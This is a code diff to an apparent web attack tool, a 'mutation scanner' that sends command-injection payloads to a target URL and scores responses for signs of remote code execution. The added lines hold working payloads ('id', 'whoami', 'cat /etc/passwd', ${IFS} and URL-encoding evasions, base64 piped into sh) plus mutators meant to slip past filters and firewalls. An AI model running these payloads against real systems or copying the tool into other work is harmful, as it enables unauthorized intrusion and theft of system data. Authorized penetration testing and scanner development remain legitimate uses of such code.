@@ -1,6 +1,7 @@
 import type { WebSocket } from "ws";
 import { randomBytes } from "crypto";
 import { MutationScannerRequestSchema } from "../lib/schemas.js";
+import { extractCommandOutput, NEXUS_MARKER, stripHtml } from "../lib/outputExtractor.js";
 
 interface MutMsg { type: string; [k: string]: unknown; }
 
@@ -93,6 +94,20 @@ const SEED_PAYLOADS = [
   "1|id",
   "1&&id",
   "'||id||'",
+  `id && echo '${NEXUS_MARKER}'`,
+  `;id;echo '${NEXUS_MARKER}'`,
+  `$(id);echo '${NEXUS_MARKER}'`,
+  "`id`;echo '${NEXUS_MARKER}'",
+  `id%0aecho '${NEXUS_MARKER}'`,
+  `id||echo '${NEXUS_MARKER}'`,
+  "id && whoami && uname -a",
+  ";whoami;id;hostname",
+  "id 2>&1 | tee /dev/stderr",
+  "|cat /etc/passwd",
+  ";cat /etc/passwd;",
+  "${IFS}id${IFS}",
+  "$(printf 'id')",
+  "bash${IFS}-c${IFS}id",
 ];
 
 const MUTATORS: ((p: string) => string)[] = [
@@ -127,6 +142,19 @@ const MUTATORS: ((p: string) => string)[] = [
   p => "{" + p + "}",
   p => p.replace(/id/g, "cat /etc/passwd"),
   p => p.replace(/id/g, "whoami"),
+  p => p + `;echo '${NEXUS_MARKER}'`,
+  p => p + " && echo '===NEXUS_SUCCESS==='",
+  p => p.replace(/id/g, "id && uname -a"),
+  p => p.replace(/id/g, "id 2>&1"),
+  p => p + " | head -1",
+  p => "(" + p + ") 2>&1",
+  p => p.replace(/;/g, "%0a"),
+  p => p.replace(/\|/g, "%7C"),
+  p => p.replace(/ /g, "+"),
+  p => p.replace(/id/g, "$(id 2>&1)"),
+  p => p.replace(/id/g, "id${IFS}2>&1"),
+  p => "\x27\x3b" + p.replace(/'/g, "\x27"),
+  p => Buffer.from(p).toString("base64").replace(/=/g,"") + "|base64${IFS}-d|sh",
 ];
 
 function crossover(a: string, b: string): string {
@@ -140,38 +168,45 @@ function scoreResponse(
   baseLen: number,
   baseElapsed: number,
   status: number,
+  baselineBody?: string,
 ): number {
   let score = 0;
-  const RCE_PATTERNS = [
-    /uid=\d+/i, /root:x:/i, /bin\/bash/i, /\/etc\/passwd/i,
-    /nx_ok_/i, /vulnerable/i, /command not found/i,
-    /sh:\s*\d+:/i, /EXECUTION CONFIRMED/i,
-  ];
-  for (const rx of RCE_PATTERNS) {
-    if (rx.test(body)) score += 100;
+  // Delegate to outputExtractor for authoritative RCE pattern matching
+  const extracted = extractCommandOutput(body, baselineBody);
+  if (extracted) {
+    score += extracted.confidence === "high" ? 200 : 120;
   }
+  // Marker confirms execution
+  const plain = stripHtml(body);
+  if (plain.includes(NEXUS_MARKER)) score += 300;
+  if (plain.includes("===NEXUS_SUCCESS===")) score += 300;
+  // Sentinel echo pattern (blind confirmation)
+  if (/nx_ok_[0-9a-f]{4}/.test(body)) score += 150;
+  // Length delta
   const lenDiff = Math.abs(body.length - baseLen);
-  if (lenDiff > 200) score += Math.min(40, Math.floor(lenDiff / 20));
-  if (elapsed - baseElapsed > 3000) score += 30;
-  if (status >= 500) score += 15;
-  if (status === 200 && body.length > baseLen + 50) score += 10;
-  return score;
+  if (lenDiff > 500) score += Math.min(60, Math.floor(lenDiff / 30));
+  else if (lenDiff > 100) score += Math.min(25, Math.floor(lenDiff / 20));
+  // Timing oracle
+  const timeDelta = elapsed - baseElapsed;
+  if (timeDelta > 5000) score += 60;
+  else if (timeDelta > 3000) score += 35;
+  else if (timeDelta > 1500) score += 15;
+  // HTTP status signals
+  if (status === 500) score += 20;
+  if (status === 200 && body.length > baseLen + 100) score += 12;
+  // WAF/block response = negative signal
+  if (status === 403 || status === 406 || status === 429) score -= 20;
+  return Math.max(0, score);
 }
 
-function detectOutput(body: string): string | null {
-  const RCE_PATTERNS: [RegExp, string][] = [
-    [/uid=\d+\([\w-]+\)\s*gid=\d+/i,    "uid/gid output — remote code execution"],
-    [/root:x:\d+:\d+/,                   "/etc/passwd — file read confirmed"],
-    [/Linux\s+\S+\s+\d+\.\d+/,          "uname output — kernel version leaked"],
-    [/Darwin\s+\S+\s+\S+/,              "uname output — macOS kernel version leaked"],
-    [/Microsoft Windows/i,               "Windows system info leaked"],
-    [/nx_ok_[0-9a-f]+/,                  "sentinel echo hit — blind RCE confirmed"],
-    [/vulnerable/i,                      "echo injection confirmed"],
-    [/EXECUTION CONFIRMED/i,             "nested execution confirmed"],
-  ];
-  for (const [rx, label] of RCE_PATTERNS) {
-    if (rx.test(body)) return label;
-  }
+function detectOutput(body: string, baselineBody?: string): string | null {
+  // Use the canonical extractor — same patterns as streamExec + autoExploit
+  const extracted = extractCommandOutput(body, baselineBody);
+  if (extracted) return `${extracted.method}: ${extracted.text.slice(0, 120).replace(/\n/g, " ")}`;
+  const plain = stripHtml(body);
+  if (plain.includes(NEXUS_MARKER))          return "marker confirmed — NEXUS_OUTPUT_END sentinel hit";
+  if (plain.includes("===NEXUS_SUCCESS===")) return "marker confirmed — NEXUS_SUCCESS sentinel hit";
+  if (/nx_ok_[0-9a-f]{4}/.test(body))       return "sentinel echo — blind RCE confirmed";
   return null;
 }
 
@@ -236,6 +271,7 @@ export function handleMutationScanner(ws: WebSocket): void {
           probe(targetUrl, injectParam, "nexus_baseline_2", httpMethod, headers),
           probe(targetUrl, injectParam, "nexus_baseline_3", httpMethod, headers),
         ]);
+        const baselineBodyRef = bases[1]?.body ?? "";
         baseLen     = Math.round(bases.reduce((a, b) => a + b.body.length, 0) / 3);
         baseElapsed = Math.round(bases.reduce((a, b) => a + b.elapsed, 0) / 3);
         baseStatus  = bases[1]?.status ?? 0;
@@ -274,7 +310,7 @@ export function handleMutationScanner(ws: WebSocket): void {
             result = await probe(targetUrl, injectParam, payload, httpMethod, headers);
           } catch { /**/ }
 
-          const score = scoreResponse(result.body, result.elapsed, baseLen, baseElapsed, result.status);
+          const score = scoreResponse(result.body, result.elapsed, baseLen, baseElapsed, result.status, baselineBodyRef);
           scores.set(payload, score);
           results.push({ payload, score, status: result.status, elapsed: result.elapsed, body: result.body });
 
